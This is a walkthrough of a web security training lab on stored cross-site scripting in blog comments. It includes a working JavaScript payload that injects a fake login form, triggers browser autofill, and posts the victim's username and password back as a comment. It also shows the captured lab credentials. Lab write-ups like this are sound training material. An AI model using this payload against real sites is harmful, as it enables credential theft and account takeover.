### Lab: Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**Note**  

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.

_____

Analysis and Exploitation:

1. Post comment with HTML to build a simplified form with username and password fields.

Set IDs to easily select them from Javascript.
```html
<section>
    <form class=login-form method=POST action=/login>
        <label>Username</label>
            <input required type=username name="username" id="user2hack">
        <label>Password</label>
            <input required type=password name="password" id="psw2hack">
            <button class=button type=submit> Log in </button>
    </form>
</section>
```
and Javascript payload with trigger on change state of 'password input field' after click event on the ' user input field'. 

```html
<script>
// FUNCTION TO GRAB USERNAME AND PASSWORD INPUT FIELDS VALUES
function grabUserPsw(){
    var username = document.getElementById("user2hack").value;
    var password = document.getElementById("psw2hack").value;
// RETURN VALUES AS ARRAY
    return [username, password]
};

// FUNCTION TO POST CREDENTIALS AS COMMENT ON ANOTHER PAGE postId=2
function postCreds(){
// EXECUTE grabUserPsw FUNCTION
    var creds = grabUserPsw();
    var username = creds[0];
    var password = creds[1];
    var credentials = "username:" + username + " - password:" + password;
    var domain = document.domain;
    var csrf = document.getElementsByName("csrf")[0].defaultValue;
    var details = {
        "csrf" : csrf,
        "postId" : 2,
        "comment" : credentials,
        "name" : "victim",
        "email" : "test@test.test",
        "website" : "http://victim"
    };
// PREPARE FORMDATA ARRAY WITH URL ENCODED VALUES AND CONCAT THEM BY CHAR '&'
    formBody = [];
    for (property in details){
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(details[property]);
        formBody.push(encodedKey + "=" + encodedValue)
    };
    formBody = formBody.join("&");

    fetch("https://"+domain+"/post/comment", {
        method : "POST",
        headers : {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body : formBody
    });
};
// WAIT FOT DOM DOCUMENT TO BE LOADED AND ATTACH 'onChange' EVENT TO THE PASSWORD INPUT FIELD
// CHROME AUTOFILL TAKES EFFECT ONLY AFTER A USER INTERACTION IN THE WINDOW (CLICK, KEYPRESS...)
document.body.onload = function(e){
    document.getElementById("psw2hack").addEventListener("change", function(e){
        postCreds();
    });
// FORCE MOUSE CLICK ON USERNAME INPUT FIELD TO TRIGGER THE LISTENER ABOVE
    document.getElementById("user2hack").click()
}
</script>
```

2. Grab the victim's username and password to log in  

    ```<p>username:administrator - password:9ksp3rjkzqztpg5t4tkw</p>```

3. Check if lab is solved
    - if "Congratulations, you solved the lab!" in response: ok!